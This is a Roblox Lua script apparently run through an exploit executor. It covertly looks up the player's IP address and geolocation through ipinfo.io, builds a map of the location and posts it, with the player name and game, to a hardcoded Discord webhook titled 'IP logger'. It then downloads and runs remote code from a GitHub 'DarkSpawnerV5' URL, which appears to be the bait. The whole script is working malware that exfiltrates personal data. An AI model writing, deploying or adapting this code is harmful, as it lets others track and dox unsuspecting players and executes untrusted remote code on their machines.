local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local webhook = "https://discord.com/api/webhooks/1402854262932770916/4nscMrOlbSjg5EJVZyV48yGLswLlw_lF0xx795zzN1L_TbB-4musJajqWamKsWTb4AEw"
local lp = Players.LocalPlayer

local function getRequestFunction()
    if syn and syn.request then return syn.request
    elseif http and http.request then return http.request
    elseif request then return request
    elseif http_request then return http_request
    else return nil end
end

local ip, city, region, country, loc = "N/A", "N/A", "N/A", "N/A", "0,0"
do
    local req = getRequestFunction()
    if req then
        pcall(function()
            local res = req({Url = "http://ipinfo.io/json", Method = "GET"})
            local data = HttpService:JSONDecode(res.Body)
            ip = data.ip or ip
            city = data.city or city
            region = data.region or region
            country = data.country or country
            loc = data.loc or loc -- format: "lat,lon"
        end)
    end
end

-- Prepare OpenStreetMap static map URL with marker
local lat, lon = loc:match("([^,]+),([^,]+)")
local mapUrl = string.format(
    "https://staticmap.openstreetmap.de/staticmap.php?center=%s,%s&zoom=10&size=400x200&markers=%s,%s,red-pushpin",
    lat, lon, lat, lon
)

local payload = {
    ["username"] = "IP logger",
    ["embeds"] = {{
        ["title"] = "ðŸš¨ IP Logger Report",
        ["color"] = 16711680,
        ["fields"] = {
            {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
            {["name"] = "Location", ["value"] = string.format("%s, %s, %s", city, region, country), ["inline"] = true},
            {["name"] = "Game", ["value"] = MarketplaceService:GetProductInfo(game.PlaceId).Name or "Unknown", ["inline"] = true},
            {["name"] = "Player", ["value"] = lp.Name, ["inline"] = true},
            {["name"] = "Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false},
        },
        ["image"] = {
            ["url"] = mapUrl
        }
    }}
}

local body = HttpService:JSONEncode(payload)
local req = getRequestFunction()
if req then
    pcall(function()
        req({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
    end)
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/jdkduejdo/DarkV5/refs/heads/main/DarkSpawnerV5"))()
